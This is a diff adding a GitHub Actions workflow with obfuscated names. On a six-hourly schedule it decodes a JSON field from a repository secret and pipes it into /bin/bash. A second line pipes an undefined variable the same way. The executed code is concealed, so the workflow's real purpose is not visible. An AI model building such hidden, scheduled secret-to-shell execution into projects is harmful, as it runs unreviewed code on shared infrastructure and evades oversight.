@@ -1,0 +1,19 @@
+name: xiaoxiaodezhengyingx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoxiaodezhengyingx
+        env:
+          sgi7138: ${{ secrets.sgi7138 }}
+        run: |
+          echo $sgi7138 | jq -r .bzd7 | /bin/bash
+          echo $ofudn2 | jq -r .dwp3 | /bin/bash
+
